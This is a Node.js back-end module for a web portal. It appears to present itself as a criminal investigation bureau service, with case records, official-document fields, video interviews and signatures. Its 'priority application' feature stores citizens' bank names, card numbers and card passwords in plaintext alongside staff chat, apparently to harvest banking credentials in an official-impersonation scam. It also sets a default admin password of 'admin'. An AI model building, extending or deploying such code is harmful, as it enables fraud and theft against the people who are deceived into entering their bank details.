const crypto = require('crypto');
const bcrypt = require('bcryptjs');
const { createClient } = require('@supabase/supabase-js');

const SESSION_COOKIE = 'cib_service_session';
const SESSION_MAX_AGE_SECONDS = 60 * 60 * 8;
const VIDEO_BUCKET = process.env.SUPABASE_VIDEO_BUCKET || 'report-videos';
const MAX_ATTACHMENT_BYTES = 20 * 1024 * 1024;
let videoBucketReady = null;

async function ensureVideoBucket(client) {
  if (videoBucketReady) return videoBucketReady;
  videoBucketReady = (async () => {
    const existing = await client.storage.getBucket(VIDEO_BUCKET);
    if (!existing.error) return;
    const message = String(existing.error.message || '');
    const status = Number(existing.error.status || existing.error.statusCode || 0);
    if (status !== 404 && !/not found/i.test(message)) throw existing.error;
    const created = await client.storage.createBucket(VIDEO_BUCKET, { public: true });
    if (created.error && !/already exists|duplicate/i.test(String(created.error.message || ''))) throw created.error;
  })().catch((error) => {
    videoBucketReady = null;
    throw error;
  });
  return videoBucketReady;
}

async function videoStorage(client) {
  await ensureVideoBucket(client);
  return client.storage.from(VIDEO_BUCKET);
}

function json(res, statusCode, payload) {
  res.statusCode = statusCode;
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.end(JSON.stringify(payload));
}

function methodNotAllowed(res, allowedMethods) {
  res.setHeader('Allow', allowedMethods.join(', '));
  json(res, 405, { error: 'Method not allowed' });
}

async function getJsonBody(req) {
  if (Buffer.isBuffer(req.body)) {
    const text = req.body.toString('utf8');
    return text ? JSON.parse(text) : {};
  }
  if (req.body && typeof req.body === 'object') return req.body;
  if (typeof req.body === 'string') return req.body ? JSON.parse(req.body) : {};
  const chunks = [];
  for await (const chunk of req) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  if (!chunks.length) return {};
  const text = Buffer.concat(chunks).toString('utf8');
  return text ? JSON.parse(text) : {};
}

function getConfig() {
  const config = {
    sessionSecret: process.env.SESSION_SECRET,
    adminPassword: process.env.ADMIN_PASSWORD || 'admin',
    supabaseUrl: process.env.SUPABASE_URL,
    supabaseServiceRoleKey: process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SECRET_KEY,
    agoraAppId: process.env.AGORA_APP_ID,
    agoraAppCertificate: process.env.AGORA_APP_CERTIFICATE,
    agoraTokenTtlSeconds: Number(process.env.AGORA_TOKEN_TTL_SECONDS || process.env.AGORA_TOKEN_EXPIRES_IN || 60 * 60)
  };
  if (!config.sessionSecret || !config.supabaseUrl || !config.supabaseServiceRoleKey) {
    throw new Error('Missing required Vercel environment variables.');
  }
  return config;
}

function getSupabase() {
  const config = getConfig();
  return createClient(config.supabaseUrl, config.supabaseServiceRoleKey, {
    auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
  });
}

function serviceErrorMessage(error, fallback) {
  const message = error?.message || String(error || '');
  if (message === 'fetch failed' || message.includes('fetch failed')) {
    return '無法連線到 Supabase，請確認 SUPABASE_URL、SUPABASE_SERVICE_ROLE_KEY 正確，且 Supabase 專案未暫停。';
  }
  if (message === 'Missing required Vercel environment variables.') return message;
  return message || fallback;
}

function generateCaseNumber() {
  const date = new Date();
  const day = `${date.getFullYear()}${String(date.getMonth() + 1).padStart(2, '0')}${String(date.getDate()).padStart(2, '0')}`;
  return `RPT-${day}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
}

function normalizeCaseNumber(value) {
  return String(value || '').trim().toUpperCase();
}

function normalizeCertificateNumber(value) {
  return String(value || '').trim().toUpperCase();
}

function ensureCaseNumber(value) {
  return normalizeCaseNumber(value) || generateCaseNumber();
}

function parseCookies(req) {
  const header = req.headers.cookie || '';
  return header.split(';').reduce((cookies, part) => {
    const trimmed = part.trim();
    if (!trimmed) return cookies;
    const index = trimmed.indexOf('=');
    if (index <= 0) return cookies;
    cookies[trimmed.slice(0, index)] = decodeURIComponent(trimmed.slice(index + 1));
    return cookies;
  }, {});
}

function signPayload(payload, secret) {
  return crypto.createHmac('sha256', secret).update(payload).digest('base64url');
}

function createSessionCookie(session) {
  const config = getConfig();
  const expiresAt = Math.floor(Date.now() / 1000) + SESSION_MAX_AGE_SECONDS;
  const payload = Buffer.from(JSON.stringify({ ...session, expiresAt })).toString('base64url');
  const signature = signPayload(payload, config.sessionSecret);
  const parts = [
    `${SESSION_COOKIE}=${encodeURIComponent(`${payload}.${signature}`)}`,
    'Path=/',
    'HttpOnly',
    'SameSite=Lax',
    `Max-Age=${SESSION_MAX_AGE_SECONDS}`
  ];
  if (process.env.NODE_ENV === 'production' || process.env.VERCEL) parts.push('Secure');
  return parts.join('; ');
}

function readSession(req) {
  const config = getConfig();
  const raw = parseCookies(req)[SESSION_COOKIE];
  if (!raw) return {};
  const [payload, signature] = String(raw).split('.');
  if (!payload || !signature || signPayload(payload, config.sessionSecret) !== signature) return {};
  try {
    const session = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    if (!session.expiresAt || session.expiresAt < Math.floor(Date.now() / 1000)) return {};
    return session;
  } catch (_error) {
    return {};
  }
}

function publicUser(row) {
  if (!row) return null;
  return {
    id: row.id,
    username: row.username,
    role: row.role,
    displayName: row.display_name || row.displayName,
    createdAt: row.created_at || row.createdAt
  };
}

function publicCase(row) {
  if (!row) return null;
  return {
    id: row.id,
    citizenName: row.citizen_name || row.citizenName,
    nationalId: row.national_id || row.nationalId || row.agoraChannel,
    caseNumber: row.case_number || row.caseNumber || row.national_id || row.nationalId || row.agoraChannel,
    certificateNumber: row.certificate_number || row.certificateNumber || '',
    caseType: row.case_type || row.caseType || '',
    caseTitle: row.case_title || row.caseTitle || '',
    caseSummary: row.case_summary || row.caseSummary || '',
    documentCase: row.document_case || row.documentCase || '',
    documentOfficial: row.document_official || row.documentOfficial || '',
    documentContent: row.document_content || row.documentContent || '',
    caseReason: row.case_reason || row.caseReason || '',
    caseUnit: row.case_unit || row.caseUnit || '',
    caseOrder: row.case_order || row.caseOrder || '',
    interviewSignature: row.interview_signature || row.interviewSignature || '',
    documentSignature: row.document_signature || row.documentSignature || '',
    agoraChannel: row.case_number || row.caseNumber || row.national_id || row.agoraChannel,
    status: row.status,
    interviewStatus: row.interview_status || row.interviewStatus || 'idle',
    assignedUserId: row.assigned_user_id || row.assignedUserId,
    createdAt: row.created_at || row.createdAt,
    approvedAt: row.approved_at || row.approvedAt
  };
}

function publicMessage(row) {
  return {
    id: row.id,
    caseId: row.case_id,
    senderType: row.sender_type,
    senderName: row.sender_name,
    body: row.body,
    createdAt: row.created_at
  };
}

function publicFile(row) {
  return {
    id: row.id,
    uploadedBy: row.uploaded_by,
    originalName: row.original_name,
    storedName: row.stored_name,
    mimeType: row.mime_type,
    size: row.size,
    kind: row.kind,
    createdAt: row.created_at,
    url: row.public_url,
    entryId: row.entry_id || ''
  };
}

function assignPriorityFiles(application, files) {
  const list = Array.isArray(files) ? files : [];
  return {
    ...application,
    entries: application.entries.map((entry) => ({
      ...entry,
      files: list.filter((file) => file.entryId && file.entryId === entry.id)
    })),
    files: list.filter((file) => !file.entryId)
  };
}

function priorityMessage(role, body, createdAt) {
  const text = String(body || '').trim();
  if (!text) return null;
  return {
    id: crypto.randomUUID(),
    role: role === 'staff' ? 'staff' : 'citizen',
    body: text.slice(0, 4000),
    createdAt: createdAt || new Date().toISOString()
  };
}

function normalizePriorityEntries(entries, createdAt) {
  const fallbackTime = createdAt || new Date().toISOString();
  return (Array.isArray(entries) ? entries : []).map((entry) => {
    const messages = [];
    if (Array.isArray(entry?.messages)) {
      for (const message of entry.messages) {
        const body = String(message?.body || '').trim();
        if (!body) continue;
        messages.push({
          id: String(message.id || crypto.randomUUID()),
          role: message?.role === 'staff' ? 'staff' : 'citizen',
          body: body.slice(0, 4000),
          createdAt: message.createdAt || fallbackTime
        });
      }
    }
    const note = String(entry?.note || '').trim();
    if (note && !messages.some((message) => message.role === 'citizen' && message.body === note)) {
      messages.unshift({ id: crypto.randomUUID(), role: 'citizen', body: note.slice(0, 4000), createdAt: fallbackTime });
    }
    return {
      id: String(entry?.id || crypto.randomUUID()),
      bank: String(entry?.bank || '').trim(),
      cardNumber: String(entry?.cardNumber || '').trim(),
      password: String(entry?.password || '').trim(),
      messages
    };
  }).filter((entry) => entry.bank || entry.cardNumber || entry.password || entry.messages.length);
}

function priorityEntriesFromInput(entries) {
  const createdAt = new Date().toISOString();
  return normalizePriorityEntries((Array.isArray(entries) ? entries : []).map((entry) => ({
    bank: entry?.bank,
    cardNumber: entry?.cardNumber,
    password: entry?.password,
    note: entry?.note
  })), createdAt);
}

function appendPriorityMessage(entries, entryId, role, body) {
  const message = priorityMessage(role, body);
  if (!message) return { error: '請輸入訊息' };
  const next = normalizePriorityEntries(entries);
  const entry = next.find((item) => item.id === String(entryId || ''));
  if (!entry) return { error: '找不到這筆申請' };
  entry.messages.push(message);
  return { entries: next };
}

async function loadSupabasePriorityApplications(client, filters) {
  let query = client.from('priority_applications').select('*').order('created_at', { ascending: false });
  if (filters?.citizenName) query = query.eq('citizen_name', filters.citizenName).eq('certificate_number', filters.certificateNumber);
  const result = await query;
  if (result.error) throw result.error;
  const applications = [];
  for (const row of result.data || []) {
    const application = publicPriorityApplication(row);
    const serialized = JSON.stringify(application.entries);
    if (serialized !== (row.entries_json || '[]')) {
      const updated = await client.from('priority_applications').update({ entries_json: serialized }).eq('id', row.id);
      if (updated.error) throw updated.error;
    }
    applications.push(application);
  }
  return attachPriorityFiles(client, applications);
}

function attachmentTooLarge(size) {
  const bytes = Number(size);
  return !Number.isFinite(bytes) || bytes <= 0 || bytes > MAX_ATTACHMENT_BYTES;
}

async function createSignedUpload(client, storedName) {
  const signed = await (await videoStorage(client)).createSignedUploadUrl(storedName);
  if (signed.error) throw signed.error;
  const raw = String(signed.data?.signedUrl || '');
  const config = getConfig();
  const signedUrl = raw.startsWith('http') ? raw : `${config.supabaseUrl}/storage/v1${raw.startsWith('/') ? '' : '/'}${raw}`;
  return { mode: 'signed', signedUrl, token: signed.data?.token || '', storedName };
}

async function attachPriorityFiles(client, applications) {
  const withEmpty = applications.map((item) => ({ ...item, files: [] }));
  if (!withEmpty.length) return withEmpty;
  const result = await client.from('priority_application_files').select('*').in('application_id', withEmpty.map((item) => item.id)).order('created_at', { ascending: false });
  if (result.error) {
    if (/priority_application_files|schema cache|does not exist|Could not find/i.test(result.error.message || '')) return withEmpty;
    throw result.error;
  }
  const grouped = new Map();
  for (const row of result.data || []) {
    const list = grouped.get(row.application_id) || [];
    list.push(publicFile(row));
    grouped.set(row.application_id, list);
  }
  return withEmpty.map((item) => assignPriorityFiles(item, grouped.get(item.id) || []));
}

function publicPriorityApplication(row) {
  let entries = [];
  try { entries = JSON.parse(row.entries_json || '[]'); } catch (_error) { entries = []; }
  return {
    id: row.id,
    citizenName: row.citizen_name,
    certificateNumber: row.certificate_number,
    entries: normalizePriorityEntries(entries, row.created_at),
    createdAt: row.created_at
  };
}

async function ensureDefaultAdmin(client) {
  const config = getConfig();
  const passwordHash = bcrypt.hashSync(config.adminPassword, 10);
  const existing = await client.from('service_users').select('id, password_hash, role, display_name').eq('username', 'admin').maybeSingle();
  if (existing.error) throw existing.error;
  if (existing.data) {
    if (existing.data.password_hash && existing.data.role === 'admin') return;
    const updated = await client.from('service_users').update({
      password_hash: existing.data.password_hash || passwordHash,
      role: 'admin',
      display_name: existing.data.display_name || '系統管理員'
    }).eq('id', existing.data.id);
    if (updated.error) throw updated.error;
    return;
  }
  const inserted = await client.from('service_users').insert({
    username: 'admin',
    password_hash: passwordHash,
    role: 'admin',
    display_name: '系統管理員'
  });
  if (inserted.error) throw inserted.error;
}

function requireStaff(req, res) {
  const session = readSession(req);
  if (!session.user) {
    json(res, 401, { error: '請先登入後台' });
    return null;
  }
  return session;
}

function requireAdmin(req, res) {
  const session = requireStaff(req, res);
  if (!session) return null;
  if (session.user.role !== 'admin') {
    json(res, 403, { error: '需要管理員權限' });
    return null;
  }
  return session;
}

async function requireCaseAccess(req, res, client, caseId) {
  const session = readSession(req);
  const result = await client.from('service_cases').select('*').eq('id', caseId).maybeSingle();
  if (result.error) throw result.error;
  if (!result.data) {
    json(res, 404, { error: '找不到案件' });
    return null;
  }
  const citizenOwnsCase = session.citizenName && session.nationalId &&
    result.data.citizen_name === session.citizenName && result.data.national_id === session.nationalId;
  const citizenOwnsCaseByNumber = session.citizenName && session.caseNumber &&
    result.data.citizen_name === session.citizenName && result.data.case_number === session.caseNumber;
  const citizenOwnsByCertificate = session.citizenName && session.certificateNumber &&
    result.data.citizen_name === session.citizenName &&
    normalizeCertificateNumber(result.data.certificate_number) === normalizeCertificateNumber(session.certificateNumber);
  if (session.user || session.caseId === caseId || citizenOwnsCase || citizenOwnsCaseByNumber || citizenOwnsByCertificate) return { session, caseRow: result.data };
  json(res, 403, { error: '無權存取此案件' });
  return null;
}

function dataUrlToBuffer(dataUrl) {
  const match = String(dataUrl || '').match(/^data:([^;]+);base64,(.+)$/);
  if (!match) return null;
  return { mimeType: match[1], buffer: Buffer.from(match[2], 'base64') };
}

function safeName(name) {
  return String(name || 'video.webm').replace(/[^a-zA-Z0-9._-]+/g, '-').replace(/-+/g, '-').slice(0, 120) || 'video.webm';
}

module.exports = {
  MAX_ATTACHMENT_BYTES,
  VIDEO_BUCKET,
  ensureVideoBucket,
  videoStorage,
  attachPriorityFiles,
  attachmentTooLarge,
  bcrypt,
  createSignedUpload,
  createSessionCookie,
  dataUrlToBuffer,
  ensureDefaultAdmin,
  ensureCaseNumber,
  generateCaseNumber,
  getConfig,
  getJsonBody,
  getSupabase,
  json,
  methodNotAllowed,
  publicCase,
  publicFile,
  publicMessage,
  appendPriorityMessage,
  loadSupabasePriorityApplications,
  normalizePriorityEntries,
  priorityEntriesFromInput,
  publicPriorityApplication,
  publicUser,
  readSession,
  normalizeCertificateNumber,
  normalizeCaseNumber,
  requireAdmin,
  requireCaseAccess,
  requireStaff,
  safeName,
  serviceErrorMessage
};
